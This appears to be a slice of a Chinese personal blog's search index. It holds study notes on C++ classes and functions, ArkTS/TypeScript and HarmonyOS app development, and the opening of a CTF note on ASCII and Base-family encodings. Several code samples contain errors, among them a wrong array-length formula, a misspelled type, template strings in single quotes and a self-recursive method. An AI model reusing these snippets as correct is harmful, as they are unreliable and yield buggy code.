函数名（参数=默认值）{}\n\n注意事项\n\n\n若某个位置已有默认参数，那么从该位置往后，从左到右都必须有默认值\n\n\n函数声明和实现只能有一个默认参数\n\n\n\n 函数占位参数\nC++中函数形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置\n语法：返回值类型 函数名（数据类型）{}\n//函数占位参数，占位参数也可有默认参数void fun(int a,int)&#123;&#125;int main()&#123;    fun(10,10);//占位参数必须填补&#125;\n ※函数重载\n满足条件：\n\n同一作用域下\n函数名称相同\n函数参数类型不同 或者个数不同 或者顺序不同\n\n 注意事项\n\n函数的返回值不可以作为函数重载的条件\n\nvoid fun(int a,int b)&#123;&#125;int fun(int a,int b)&#123;&#125;//×，两者仅返回值(int/void)不同\n\n引用作为重载条件\n\nvoid fun(int &amp;a)&#123;&#125;void fun(const int &amp;a)&#123;&#125;int main()&#123;    int a=10;    fun(a);//调用无const版本    fun(10);//调用有const&#125;\n\n函数重载避免默认参数\n\n 类和对象\n\n\n\n权限\n访问权限\n\n\n\n\n公共权限public\n类内可以访问  类外可以访问\n\n\n保护权限protected\n类内可以访问  类外不可访问  子类可以访问父类中的保护内容\n\n\n私有权限private\n类内可以访问  类外不可访问  子类不可访问父类中的保护内容\n\n\n\n 构造函数&amp;析构函数\n 构造函数\n语法：类名（）{}\n\n无返回值 也不写void\n函数名称与类名相同\n可以有参数，即可以发生重载\n程序调用对象时自动调用构造，无需手动调用，且只会调用一次\n\n 析构函数\n语法：~类名（）{}\n\n无返回值 也不写void\n不可以有参数，因此不可发生重载\n\n 构造函数的分类及调用\n 分类\n两种分类方式：\n\n按参数分：有参构造   无参构造（默认构造）\n按类型分：普通构造   拷贝构造\n\n//拷贝构造函数Person(const Person &amp;p)&#123;&#125;\n 调用\n三种调用方式：\n\n括号法\n显示法\n隐式转换法\n\nvoid test()&#123;    //括号法    Person p1;//默认构造函数调用[不要加()!编译器会认为是一个函数的声明]    Person p2(10);//有参构造函数    Person p3(p2);    //显示法    Person p1;    Person p2=Person(10);//有参构造    Person p2=Person(p2);//拷贝构造    //隐式转换法    Person p4=10;//相当于Person p4=Person(10);    Person p4=p4;//拷贝构造&#125;\n\nPerson(10);//匿名对象，特点：当前执行结束后，系统会立即回收掉匿名对象\n注意：不要利用拷贝构造函数，初始化匿名对象，编译器会认为Person(p3) === Person p3//对象的声明\n\n 拷贝构造函数调用时机\n\n使用一个已经创建完毕的对象来初始化一个对象\n值传递的方式给函数参数传值\n以值的方式返回局部对象\n\n 构造函数调用规则\n默认情况下，C++编译器至少给一个类添加3个函数\n\n默认构造函数（无参，函数体为空）\n默认析构函数（无参，函数体为空）\n默认拷贝析构函数，对属性进行值拷贝\n\n调用规则：\n\n若用户定义有参构造函数，C++不再提供默认无参构造，但会提供默认拷贝构造\n若用户定义拷贝构造函数，C++不再提供其他构造函数\n\n ※深拷贝与浅拷贝\n\n面试经典问题，常见的一个坑\n\n浅拷贝：简单的赋值拷贝操作\n深拷贝：在堆区重新申请空间，进行拷贝操作\n浅拷贝带来的问题：堆区的内存重复释放（利用深拷贝解决\n总结：若属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题\n 初始化列表\nPerson(int a,int b,int c):a(a),b(b),c(c)&#123; ... &#125;int main()&#123;Person p;&#125;\n 类对象作为类成员\n当其他类对象作为本类成员（对象成员），先调用对象成员的构造，再调用本类的构造，析构的顺序与构造相反\n 静态成员\n在成员变量和成员函数前加上关键字static\n 静态成员变量\n\n所有对象共享同一份数据\n在编译阶段分配内存\n类内声明，类外初始化\n\nclass person&#123;public:    static int a;&#125;;int person::a=1;\n静态成员变量不属于某个对象上，所有对象都共享同一份数据\n因此静态成员变量有两种访问方式\n\n通过对象进行访问\n\nperson p;cout&lt;&lt;p.a&lt;&lt;endl;\n\n通过类名进行访问\n\ncout&lt;&lt;person::a&lt;&lt;endl;\n\n有访问权限，私有权限访问不到\n\n 静态成员函数\n\n所有对象共享同一个函数\n静态成员函数只能访问静态成员变量\n\n同上有两种访问方式，且有访问权限\n空对象占用内存空间为：1\n\nC++编译器会给每个空对象分配一个字节空间，是为了区分空对象占内存的位置\n\n this指针\n本质：指针常量\n指向被调用的成员函数所属的对象\n是隐含每一个非静态成员函数内的一种指针\n用途：\n\n当形参和成员变量同名时，可用this指针来区分\n在类的非静态成员函数中返回对象本身，可使用return *this\n\n const修饰成员函数\n 常函数\n\n成员函数后加const后我们称为这个函数为常函数\n常函数内不可以修改成员属性\n成员属性声明时加关键字mutable后，在常函数中依然可以修改\n\n 常对象\n\n声明对象前加const称该对象为常对象\n常对象只能调用常函数\n\n 排序算法\n 冒泡排序\n\n比较相邻的元素，若前一个比后一个大，交换他们两个\n对每对相邻元素做同样工作，执行完毕后找出第一个最大值\n重复以上步骤，每次比较次数-1，直到无需比较\n\n\n外层循环：排序总轮数=元素个数-1\n内层循环：每轮对比数=元素个数-排序轮数-1\n\n 杂项\n\n数组个数计算方法：\n\nsizeof(arr)/sizeof(arr[0])-1\n\n随机数生成\n\n#include&lt;ctime&gt;//添加随机数种子（利用当前系统时间生成随机数，防止每次随机数都一样）srand((unsighed int)time(NULL));int num=rand()%100//生成0~99随机数\nvisual studio中Ctrl+D快速复制当前一行\n值传递时，函数形参发生改变，并不会影响实参\n","tags":["技术栈"]},{"title":"ArkTS","url":"/2024/07/09/ArkTS/","content":" ArkTS语言\n TypeScript\n 基础语法\nTypeScript在JavaScript基础上加入了静态类型检查功能，因此每个变量都有固定的数据类型\nlet msg: string=&#x27;hello world&#x27;\nlet：声明变量的关键字，const代表常量\nmsg：变量名，自定义\nstring：变量数据类型\n\n基础类型\n\n\nboolean：布尔值\nlet isDone:boolean=false;\n\n\nnumber：数字\nTypeScript里所有数字都是浮点数，除了支持十进制，还支持二进制、八进制、十六进制，表示方式与其他语言类似\nlet decLiteral:number=2023let binaryLiteral:number=0b11111100111let octalLiteral:number=0o3747let hexLiteral:number=0x7e7\n\n\nstring：字符串，可用双引号（&quot;）或单引号（'）表示\nlet name:string=&quot;Jacky&quot;name=&quot;Tom&quot;name=&#x27;Mick&#x27;\n\n\n数组\nTypeScript支持一下两种方式声明数组：第一种，可在元素类型后接上[]，表示由此类型元素组成的一个数组；第二种方式是使用数组泛型，Array&lt;元素类型&gt;\nlet ages: number[]=[21,18]let names: Array&lt;string&gt;=[&#x27;Jack&#x27;,&#x27;Rose&#x27;]console.log(names[0])\n\n在数组循环时，可以有如下两种迭代方式\nlet ages: number[]=[&#x27;Jack&#x27;,&#x27;Rose&#x27;]//for in迭代器，遍历得到数组角标for (const i in names)&#123; console.log(i+&#x27;:&#x27;+name[i])&#125;//for if迭代器，直接得到元素for (const name of names)&#123; console.log(name)&#125;\n\n\n\n元组\n元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同\nlet x:[string,number]x=[&#x27;hello&#x27;,10]\n\n\nenum：枚举\nenum Color&#123;Red,Green,Blue&#125;let c:Color=Color.Blue\n\n\nunknown\n当为在编程阶段还不清楚类型的变量指定一个类型，可用unknown类型来标记此变量\nlet notSure:unknown=4notSure=&#x27;maybe a string instead&#x27;notSure=false\n\n\nvoid\n当一个函数没有返回值时，其返回值类型是void\nfunction test():void&#123;    console.log(&#x27;This is function is void&#x27;)&#125;\n\n\nnull和undefined\nlet u:undefined=undefinedlet n:null=null\n\n\nunion：联合类型\n表示取值可以为多种类型中的一种\nlet myFavoriteNumber:string|numbermyFavoriteNumber=&#x27;six&#x27;myFavoriteNumber=6\n\n\n\n补充\n\n\nany：不确定类型，可以使任意类型\nlet a: any=&#x27;jack&#x27;a=21\n\n\nObject：对象\n\n\n let p=&#123;name:&#x27;jack&#x27;,age:21&#125; \n取对象里的属性的时候↓\n  console.log(p.name)console.log(p[&#x27;name&#x27;])\n\n 循环\n当一个对象实现了Symbol.iterator属性时，认为它是可迭代的。一些内置的类型如Array、Map、Set、String、Int32Array、Uint32Array等都具有可迭代性\n//for..of语句let someArray=[1,&quot;string&quot;,false]for(let entry of someArray)&#123;    console.log(entry)//1,&quot;string&quot;,false&#125;\n//for..of vs for..in语句let list=[4,5,6]for (let i in list)&#123;    console.log(i)//&quot;0&quot;,&quot;1&quot;,&quot;2&quot;&#125;for (let i of list)&#123;    console.log(i)//&quot;4&quot;,&quot;5&quot;,&quot;6&quot;&#125;\n\nfor in：遍历得到数组角标\nfor of：遍历直接得到元素\n\n 函数\nTypeScript通常利用function关键字声明函数，并且支持可选参数、默认参数、箭头函数等特殊语法\n\n有名函数，给变量设置为number类型\n\nfunction add(x:number,y:number):number&#123;    return x+y&#125;\n\n匿名函数，给变量设置为number类型\n\nlet myAdd=function(x:number,y:number):number&#123;    return x+y&#125;\n\n无返回值函数，返回值void可省略\n\n function sayHello(name: string):void&#123;    console.log(&#x27;你好，&#x27;+name+&#x27;！&#x27;)&#125;sayHello(&#x27;Jack&#x27;)\n\n箭头函数\n\n//它是定义匿名函数的简写语法，用于函数表达式，它省略了function关键字。箭头函数的定义如下，其函数是一个语句块：([param1,param2,...param n])=&gt;&#123;    //代码块&#125;//其中，括号内是函数的入参，可以有0到多个参数，箭头后是函数的代码块。可将这个箭头函数赋值给一个变量，如下所示：let sayHi=(name: String) =&gt;&#123;    console.log(&#x27;你好，&#x27;+name+&#x27;！&#x27;)&#125;sayHi(&#x27;Rose&#x27;)\n\n可选参数\n\n//在参数名后加?,表示该参数是可选的function sayHello(name?: String)&#123;    //判断那么是否有值，如果无值则给一个默认值    name=name ? name:&#x27;陌生人&#x27;    console.log(&#x27;你好，&#x27;+name+&#x27;!&#x27;)&#125;sayHello(&#x27;Jack&#x27;)sayHello()\n//函数的剩余参数，剩余参数会被当做个数不限的可选参数。可以一个都没有，也可以有任意个。可以用省流号(...)进行定义function getEmployeeName(firstName:string,...restOfName:string[])&#123;    return firstName+&#x27;&#x27;+restOfName.join(&#x27;&#x27;)&#125;let employeeName1=getEmployeeName(&#x27;Tom&#x27;)let employeeName2=getEmployeeName(&#x27;Tom&#x27;,&#x27;Sandy&#x27;,&#x27;Lucas&#x27;,&#x27;Mike&#x27;)\n\n参数默认值\n\n//在参数后面赋值，表示参数默认值//如果调用者没有传参，则使用默认值function sayHello(name: String=&#x27;陌生人&#x27;)&#123;    console.log(&#x27;你好，&#x27;+name+&#x27;!&#x27;)&#125;---sayHello(&#x27;Jack&#x27;)sayHello()\n 类和接口\nTypeScript具备面向对象编程的基本语法，例如interface、class、enum等。也具备封装、继承、多态等面向对象基本特征\nclass：类\nclass Person&#123;    private name:string    private age:number        constructor(name:string,age:number)&#123;        this.name=name        this.age=age    &#125;        public getPersonInfo():string&#123;        return &#x27;My name is $&#123;this.name&#125; and age is $&#123;this.age&#125;&#x27;    &#125;&#125;---let person1=new Person(&#x27;Jacky&#x27;,18)person1.getPersonInfo()\nextends：继承\nclass Employee extends Person&#123;    private department:string        constructor(name:string,age:number,department:string)&#123;        super(name,age)        this.department=department    &#125;        public getEmployeeInfo():string&#123;        return this.getEmployeeInfo()+&#x27;and work in $&#123;this.department&#125;&#x27;    &#125;&#125;---let person2=new Employee(&#x27;Tom&#x27;,28,&#x27;HUAWEI&#x27;)person2.getPersonInfo()person2.getEmployeeInfo()\n综合实践：\n//定义矩形类class Rectangle&#123;    //成员变量    private width: number    private length: number    //构造函数    constructor(width: number.length: number)&#123;        this.width=width        this.length=length    &#125;    //成员方法    public area():number&#123;        return this.width * this.length    &#125;&#125;//定义正方形class Square extends Rectangle&#123;    constructor(sicde: number)&#123;        //调用父类构造        super(side,side)    &#125;&#125;let s=new Square(10)console.log(&#x27;正方形面积为：&#x27;+s.area())\n\n//定义枚举enum Msg&#123;    HI=&#x27;Hi&#x27;,    HELLO=&#x27;Hello&#x27;&#125;//定义接口，抽象方法接收枚举参数interface A&#123;    say(msg: Msg):void&#125;//实现接口class B implements A&#123;    say(msg: Msg):void&#123;        console.log(msg+&#x27;,I am B&#x27;)    &#125;&#125;//初始化对象let a:A=new B()//调用方法，传递枚举参数a.say(Msg.HI)\n 模块\nmodule。模块可以相互加载，并可以用特殊的指令export和import来交换功能，从另一个模块调用一个模块的函数\n两模块间关系是通过在啊文件级别上使用import和export建立的。模块里面的变量、函数和类等在模块外部都是不可见的，除非明确地使用export导出它们。类似地，必须通过import导入其他模块导出的变量、函数、类等\nexport class NewData&#123;    title:string    content:string        constructor(title:string,content:string)&#123;        this.title=title        this,content=content    &#125;&#125;---import&#123;NewData&#125;from &#x27;../common/bean/NewData&#x27;\n\n综合实践：\n/*rectangle.ts*///定义矩形类，并通过export导出export class Rectangle&#123;    //成员变量    private width: number    private length: number    //构造函数    constructor(width: number.length: number)&#123;        this.width=width        this.length=length    &#125;&#125;//定义工具方法，求矩形面积，并通过export导出export function area(rec: Rectangle):number&#123;    return rec.width * rec.length&#125;\n/*index.ts*///通过import语法导入，from后面写文件的的地址import &#123;Rectangle,area&#125; from &#x27;../rctangle&#x27;//创建Rectangle对象let r=new Rectangle(10,20)//调用area方法console.log(&#x27;面积为：&#x27;+area(r))\n DevEco Studio\n\n目录概述\n\n├─Demo│  ├─AppScope               存放整个应用公共信息与资源│  ├─entry（Ability）        默认初始模块│  │  ├─src│  │  │  ├─main│  │  │  │  ├─ets           存放编写的代码文件│  │  │  │  │  ├─pages      存放页面│  │  │  │  ├─resources│  │  │  │  │  ├─base│  │  │  │  │  │  └─media   存放相关的静态资源│  │  │  │  │  ├─zh_CN      限定词目录（国家、语言、设备等）│  │  ├─configuration   存放相应模块的配置文件│  │  └─resources       模块内公共资源│  └─configuration      存放工程应用级的配置文件\n\n运行\n\ntools-Device Manager-Local Emulator\n 了解基本工程目录\n 工程级目录\n工程的目录结构如下\n\n其中详细如下：\n\nAppScope中存放应用全局所需要的资源文件\nentry是应用的主模块，存放HarmonyOS应用的代码、资源等\noh_modules是工程的依赖包，存放工程依赖的源文件\nbuild-profile.json5是工程级配置信息，包括签名、产品配置等\nhvigorfile.ts是工程级编译构建任务脚本，hvigor是基于任务管理机制实现的一款全新的自动化构建工具，主要提供任务注册编排，工程模型管理、配置管理等核心能力\noh-package.json5是工程级依赖配置文件，用于记录引入包的配置信息\n\n在AppScope，其中有resources文件夹和配置文件app.json5。AppScope&gt;resources&gt;base中包含element和media两个文件夹，\n\n其中element文件夹主要存放公共的字符串、布局文件等资源\nmedia存放全局公共的多媒体资源文件\n\n\n 模块级目录\n\nentry&gt;src目录中主要包含总的main文件夹，单元测试目录ohosTest，以及模块级的配置文件\n\nmain文件夹中，ets文件夹用于存放ets代码，resources文件存放模块内的多媒体及布局文件等，module.json5文件为模块的配置文件\nohosTest是单元测试目录\nbuild-profile.json5是模块级配置信息，包括编译构建配置项\nhvigorfile.ts文件是模块级构建脚本\noh-package.json5是模块级依赖配置信息文件\n\n进入src&gt;main&gt;ets目录中，其分为entryability、pages两个文件夹\n\nentryability存放ability文件，用于当前ability应用逻辑和生命周期管理\npages存放UI界面相关代码文件，初始会生成一个Index页面\n\n\nresources目录下存放模块公共的多媒体、字符串及布局文件等资源，分别存放在element、media文件夹中\n\n app.json5\nAppScope&gt;app.json5是应用的全局的配置文件，用于存放应用公共的配置信息\n\n其中配置信息如下：\n\nbundleName是包名\nvendor是应用程序供应商\nversionCode是用于区分应用版本\nversionName是版本号\nicon对应于应用的显示图标\nlabel是应用名\n\n module.json5\nentry&gt;src&gt;main&gt;module.json5是模块的配置文件，包含当前模块的配置信息\n\n其中module对应的是模块的配置信息，一个模块对应一个打包后的hap包，hap包全称是HarmonyOS Ability Package，其中包含了ability、第三方库、资源和配置文件。其具体属性及其描述可以参照下表1\n\n\n\n属性\n描述\n\n\n\n\nname\n该标签标识当前module的名字，module打包成hap后，表示hap的名称，标签值采用字符串表示（最大长度31个字节），该名称在整个应用要唯一。\n\n\ntype\n表示模块的类型，类型有三种，分别是entry、feature和har。\n\n\nsrcEntry\n当前模块的入口文件路径。\n\n\ndescription\n当前模块的描述信息。\n\n\nmainElement\n该标签标识hap的入口ability名称或者extension名称。只有配置为mainElement的ability或者extension才允许在服务中心露出。\n\n\ndeviceTypes\n该标签标识hap可以运行在哪类设备上，标签值采用字符串数组的表示。\n\n\ndeliveryWithInstall\n标识当前Module是否在用户主动安装的时候安装，表示该Module对应的HAP是否跟随应用一起安装。- true：主动安装时安装。- false：主动安装时不安装。\n\n\ninstallationFree\n标识当前Module是否支持免安装特性。- true：表示支持免安装特性，且符合免安装约束。- false：表示不支持免安装特性。\n\n\npages\n对应的是main_pages.json文件，用于配置ability中用到的page信息。\n\n\nabilities\n是一个数组，存放当前模块中所有的ability元能力的配置信息，其中可以有多个ability。\n\n\n\n对于abilities中每一个ability的属性项，其描述信息如下表2\n\n\n\n属性\n描述\n\n\n\n\nname\n该标签标识当前ability的逻辑名，该名称在整个应用要唯一，标签值采用字符串表示（最大长度127个字节）。\n\n\nsrcEntry\nability的入口代码路径。\n\n\ndescription\nability的描述信息。\n\n\nicon\nability的图标。该标签标识ability图标，标签值为资源文件的索引。该标签可缺省，缺省值为空。如果ability被配置为MainElement，该标签必须配置。\n\n\nlabel\nability的标签名。\n\n\nstartWindowIcon\n启动页面的图标。\n\n\nstartWindowBackground\n启动页面的背景色。\n\n\nvisible\nability是否可以被其他应用程序调用，true表示可以被其它应用调用， false表示不可以被其它应用调用。\n\n\nskills\n标识能够接收的意图的action值的集合，取值通常为系统预定义的action值，也允许自定义。\n\n\nentities\n标识能够接收的Want的Action值的集合，取值通常为系统预定义的action值，也允许自定义。\n\n\nactions\n标识能够接收Want的Entity值的集合。\n\n\n\n main_pages.json\nsrc/main/resources/base/profile/main_pages.json文件保存的是页面page的路径配置信息，所有需要进行路由跳转的page页面都要在这里进行配置\n\n Hello World\n@Entry@Componentstruct Index &#123;  @State message: string = &#x27;Hello World&#x27;  build() &#123;    Row() &#123;      Column() &#123;        Text(this.message)          .fontSize(50)          .fontWeight(FontWeight.Bold)      &#125;      .width(&#x27;100%&#x27;)    &#125;    .height(&#x27;100%&#x27;)  &#125;&#125;\n\n 组件介绍\n Image：图片显示组件\n\n\n声明Image组件并设置图片源\nImage(src: string|PixelMap|Resource)\n\n\nstring格式，通常用来加载网络图片\n\n需要申请网络访问权限：\nohos.permission.INTERNET\n\nImage(&#x27;https://xxx.png&#x27;)\n\n\nPixelMap格式，可以加载像素图，常用在图片编辑中\nImage(PixelMapObject)\n\n精确到像素，将来可以去操作这些像素从而实现对图片的编辑修改\n使用起来较繁琐，需要构建PixelMap对象然后传递给Image\n\n\n\nResource格式，加载本地图片，推荐使用\nImage($r(&#x27;app.media.example&#x27;))Image($rawfile(&#x27;example.png&#x27;))\n\n对应项目文件的两个目录：media、rawfile\n\n\n\n\n\n添加图片属性\nImage(&#x27;....&#x27;)\t.borderRadius(10)//边框圆角\t.interpolation(ImageInterpolation.High)//图片插值（抗锯齿化）\n此外还需要在module.json5文件中的module下添加：\n&quot;requestPermissions&quot;:[\t&#123;\t&quot;name&quot;: &quot;ohos.permission.INTERNET&quot;\t&#125;]\n\n\n Text：文本显示组件\n\n\n声明Text组件并设置文本内容\nText(content?: string|Resource)\n\n\nstring格式，直接填写文本内容\nText(&#x27;图片宽度&#x27;)\n\n\nResource格式，读取本地资源文件\nText($r(&#x27;app.string.width_label&#x27;))\n\n读取本地资源文件里的字符串内容然后展示在页面\n在限定词目录中写入键值对后也要在base目录中的string.json写入\n\n\n\n\n\n\n TextInput：文本输入框\n\n\n声明TextInput组件：\nTextInput(&#123;placeholder?: ResourceStr, text?: ResourceStr&#125;)\n\n\nplaceholder：输入框无输入时的提示文本\nTextInput(&#123;placeholder: &#x27;请输入账号或手机号&#x27;&#125;)\n\n\ntext：输入框当前的文本内容\nTextInput(&#123;text: &#x27;test&#x27;&#125;)\n\n\n\n\n添加属性和事件\n.type(InputType.Password)//输入框类型.onChange(value=&gt;&#123;    //value是用户输入的文本内容&#125;)\n\n\n Button：按钮组件\n\n\n声明Button组件，label是按钮文字\nButton(label?: ResourceStr)\n\n\n文字型按钮\nButton(&#x27;点我&#x27;)\n\n\n自定义按钮，在Button内嵌套其他组件\nButton()&#123;    Image($r(&#x27;app.media.search&#x27;)).width(20).margin(10)&#125;\n\n\n\n\n添加属性和事件\nButton(&#x27;点我&#x27;)\t.type(ButtonType.Capsule)\t.onClick(()=&gt;&#123;    //处理点击事件&#125;)\n\n\n Slider组件：滑动条组件\nSlider(options?:SliderOptions)\nSlider(&#123;    min:0,    max:100,    value:40,    step:10,//步长    style:SliderStyle.OutSet,//InSet    direction:Axis.Horizontal,//Vertical    reverse:false//是否反向滑动&#125;)\t.showTips(true)//是否展示value百分比提示\n Stack组件：堆叠容器\n子组件按照顺序依次入栈，后一个子组件覆盖前一个子组件\nStack(value?:&#123;alignContent?:Alignment&#125;)\n 页面布局\n\n\n\n\n\n属性方法名\n说明\n参数\n\n\n\n\njustifyContent\n设置子元素在主轴方向的对齐格式\nFlexAlign枚举\n\n\nalignItems\n设置子元素在交叉轴方向的对齐格式\nRow容器使用VerticalAlign枚举Column容器使用HorizontalAlign枚举\n\n\n\n\n主轴方向的对齐格式\n\n\n\n交叉轴方向的对齐格式\n\n\n\n默认情况下，在交叉轴上默认都是center\n\n\npadding&amp;margin\n\nmargin是指从自身边框到另一个容器边框之间的距离，即容器外距离，是隔开元素与元素的间距\npadding是指自身边框到自身内部另一个容器边框之间的距离，即可容器内距离，是盒子边框与盒子内部元素的距离\n\n\nList：支持自动滚动功能\n\n既可以纵向排列，也可以横向排列\n 自定义组件\n定义名为TitleComponent的自定义组件\n@componentstruct Header&#123;\tprivate title: ResourceStr\tbuild()&#123;\t\t...\t&#125;&#125;\n定义名为ItemPage的自定义组件，在其中使用Header组件\n@Entry@componentstruct ItemPage&#123;\tbuild()&#123;\t\tColumn()&#123;\t\t\tHeader(&#123;title:&#x27;列表&#x27;&#125;)\t\t&#125;\t&#125;&#125;\n当一个组件中使用另一个组件的内容时，这个组件就被称为父组件，被使用的组件成为子组件\n 自定义组件生命周期回调函数\n\n自定义组件从创建到销毁的过程，此过程中系统提供了生命周期回调函数aboutToAppear和aboutToDisappear用于通知开发者该自定义组件所处的阶段\naboutToAppear在创建自定义组件的实例后到执行其build函数之前执行，可在aboutToAppear函数中对UI需要展示的数据进行初始化，或者申请定时器资源等操作，这样在后续build函数中可以使用这些数据和资源来进行UI展示\naboutToDisappear在自定义组件实例被销毁时调用，可在aboutToDisappear中释放不再使用的资源避免资源泄露。比如释放在aboutToAppear申请的定时器资源等。\n所以自定义组件生命周期回调函数能够为我们在不同阶段操作自定义组件提供契机，方便实现业务逻辑。需要注意的是由于这些回调函数是私有的，系统会在特定的时间下自动调用，是无法手动调用这些回调函数的\n @Entry修饰的页面入口组件生命周期回调函数\n\n对于页面入口组件，系统提供了另外三个生命周期函数：onPageShow、onBackPress和onPageHide\n 自定义构建函数\n\n用来做内部的页面封装更加合适一些\n\n\n全局自定义构建函数（当前组件的外部）\n\n@Builder function ItemCard()&#123;    //页面结构&#125;\n\n局部自定义构建函数\n\n@Builder ItemCard()&#123;    //页面结构&#125;\n局部在调用时需要写为this.ItemCard()\n 自定义公共样式\n\n全局公共样式函数\n\n@Styles function fillScreen()&#123;    //样式&#125;\n\n凡是公共样式函数，内部写的属性必须是所有组件通用的属性\n如果是组件特殊属性，用@Extend来继承，且Extend不能写在组件内\n@Extend(要继承的组件名)\n@Extend(Text) function priceText()&#123; //样式&#125;\n\n\n内部公共样式函数\n\n@Styles fillScreen()&#123;    //样式&#125;\n 状态管理\n @State\n在声明式UI中，是以状态驱动视图更新\nflowchart LRA(状态&lt;br/&gt;State) -- 渲染 --&gt; B(视图&lt;br/&gt;View)B -- 互动事件 --&gt; A\n\n状态（State）：驱动视图更新的数据（被装饰器标记的变量）\n视图（View）：基于UI描述渲染得到的用户界面\n\n@State装饰器标记的变量必须初始化，不能为空\n@State支持Object、class、string、number、boolean、enum类型以及这些类型的数组\n嵌套类型以及数组中的对象属性无法触发视图更新\n @Prop、@Link\n父（入口组件）子（被引用的其他组件）组件之间需要数据同步时使用\n\n\n\n\n@Prop\n@Link\n\n\n\n\n同步类型\n单向同步\n双向同步\n\n\n允许装饰的变量类型\n@Prop只支持string、number、boolean、enum类型父组件对象类型，子组件是对象属性不可以是数组、any\n父子类型一致：string、number、boolean、enum、object、class以及他们的数组数组中元素增、删、替换会引起刷新嵌套类型以及数组中的对象属性无法触发视图更新\n\n\n初始化方式\n不允许子组件初始化\n父组件传递，进制子组件初始化\n\n\n\n @Provide、@Consume\n@Provide和@Consume可以跨组件提供类似于@Prop和@Link的双向同步\n\n\n代价：需要内部去维护，有一些资源上的损耗\n\n @Observed、@ObjectLink\n@Observed和@ObjectLink用于在设计嵌套对象或数组元素为对象的场景中进行双向数据同步\n 页面路由\n页面栈的最大容量上限为32个页面，使用router.clear()方法可以清空页面栈，释放内存\nRouter有两种页面跳转模式：\n\nrouter.pushUrl()：目标页不会替换当前页，而是压入页面栈，因此可以用router.back()返回当前页\nrouter.replaceUrl()：目标页替换当前页，当前页会被销毁并释放资源，无法返回当前页\n\nRouter有两种页面实例模式：\n\nStandard：标准实例模式，每次跳转都会新建一个目标页并压入栈顶。默认就是这种模式\nSingle：单实例模式，如果目标页已经在栈中，则离栈顶最近的同URL页面会被移动到栈顶并重新加载\n\n\n\n导入HarmonyOS提供的Router模块\nimport router from &#x27;@ohos.router&#x27;\n\n\n利用router实现跳转、返回等操作\n//跳转到指定路径，并传递参数router.pushUrl(\t&#123;        url:&#x27;pages/Image&#x27;,        //params：传递的参数（可选）        params:&#123;id:1&#125;    &#125;,    router.RouterMode.Single,    //异常响应回调函数，错误码：    //100001：内部错误，可能是渲染失败    //100002：路由地址错误    //100003：路由栈种页面超过32    err=&gt;&#123;        if(err)&#123;            console.log(&#x27;路由失败.&#x27;)        &#125;    &#125;)\n//获取传递过来的参数params: any=router.getParams()//返回上一页router.back()//返回指定页，并携带参数router.back(\t&#123;        url:&#x27;pages/Index&#x27;,        params:&#123;id:10&#125;    &#125;)\n\n\n 杂项\n\n\nparseInt()：将字符串转成int类型\n\n\ntoFixed()：将数字转成字符串，括号中为保留小数点的位数\n\n\n子组件的build函数里只能有一个根元素（比如Button和List并列，应将他俩封装到一个容器里）\n\n\n.opacity(0.5)：修改透明度\n\n\n","tags":["技术栈"]},{"title":"CTF常见编码","url":"/2023/08/22/CTF%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/","content":" 补充\n计算机中的数据都是按字节存储。一个字节(Byte)由8个二进制位组成(bit)。（组成范围是0~255(28)) 一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从00000000到11111111。\n ASCII编码\nASCII 码是对英语字符与二进制位之间的关系，做了统一规定。基本的 ASCII 字符集共有 128 个字符，其中有 96 个可打印字符，包括常用的字母、数字、标点符号等。如：\n空格SPACE 是32（二进制：00100000）；数字0是48（二进制：00110000）；大写字母A是65（二进制：01000001）\n另外还有 32 个控制字符（不能打印出来）\n这128个符号，只占用了一个字节的后面7位，最前面的一位统一规定为0。\n特征：只含有数字\n\n0-9：49-57\nA-Z：65-90\na-z：97-122\n\n明文：hello,world.十六进制：0x680x650x6c0x6c0x6f0xff0c0x770x6f0x720x6c0x640x2e十进制：1041011081081112551211911111410810046二进制：011010000110010101101100011011000110111100101100011101110110111101110010011011000110010000101110\n解码链接1\n解码链接2\nASCII码对照表\n\n Base家族编码\n\nbase16/base32/base64/base58/base85/base100\n\nBase16编码是将二进制文件转换成由（0-9、A-F）16个字符组成的文本\nBase32编码由（A-Z、2-7）32个可见字符构成，&quot;=&quot;符号用作后缀填充。\nBase36的密文由（A-Z、0-9）36个字符组成，加密仅支持整数数字，解密仅支持字符串，不支持中文\nBase64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充。\nBase58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’\nBase91的密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成\nBase100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。\n明文：hello，world.123456base16: 68656C6C6F2C776F726C642E313233343635特征：大写字母(A-Z)和数字(0-9)，不用‘=’补齐，且数字要多于字母。\nbase32: NBSWY3DPFR3W64TMMQXDCMRTGQ3DK===特征：大写字母(A-Z)和数字(2-7)，不满5的倍数，用‘=’补齐。\nbase58: 2smDFYXWKE8vc8XA8dadEYcSqcQb特征：相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+&quot;和&quot;/&quot;符号，最主要的是后面不会出现&#x27;=&#x27;。\nbase64: aGVsbG8sd29ybGQuMTIzNDY1特征：大小写字母（A-Z，a-z）和数字（0-9）以及特殊字符‘+’，‘/’，不满3的倍数，用‘=’补齐。\nbase85: BOu!rDst&gt;tGAhM&lt;A1fSl1GgsI特征：特点是奇怪的字符比较多，但是很难出现等号\nbase91: TPwJh&gt;go2Tv!_,aRA2IbLmA特征：由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;~”）组成不支持中文。\nbase100: 👟👜👣👣👦📦💳💃👮👦👩👣👛🐥🐨🐩🐪🐫🐬🐭特征：就是一堆Emoji表情\nbase16 / base32 / base64\nbase58\nbase85\nbase91\nbase100\n MD5、SHA1、HMAC、NTLM等类似加密型\n 